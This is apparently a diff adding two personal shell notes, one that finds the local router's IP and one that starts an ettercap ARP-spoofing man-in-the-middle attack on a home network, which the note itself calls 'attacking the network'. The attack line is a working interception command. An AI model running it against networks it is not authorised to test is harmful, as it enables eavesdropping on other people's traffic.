@@ -1,0 +1,9 @@
+
+
+#to see the ip address of my router:
+
+ip route | grep default | awk '{print $3}'
+
+#to start attacking the network. T S I, than wifi interface name, /router ip// /my main ip//:
+ sudo ettercap -T -S -i wlp8s0 -M arp:remote /10.0.0.138// /10.0.0.85//
+
